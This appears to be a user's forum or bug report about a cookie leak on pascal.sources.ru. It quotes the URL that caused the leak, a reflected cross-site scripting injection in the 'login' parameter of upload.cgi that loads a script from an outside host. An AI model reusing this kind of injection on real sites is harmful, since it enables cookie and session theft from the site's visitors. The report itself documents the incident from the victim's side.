Hidden redirect (or auto-postback) to another site cause cooky leak

Recently I followed the link displayed in URL and my cooky (for pascal.sources.ru site) somehow were sent to another server (after auto postback caused by the javascript on this page or another circumstances).

Sometime later when I opened this link again I see following address in the page properties:

http://pascal.sources.ru/cgi-bin/upload.cgi?login="><script src=http://ppc-1.hut1.ru/x.js></script>

Unfortunately, x.js already deleted from the ppc-1.hut1.ru web-server, so it is unable to analize certain action which are follow such result.
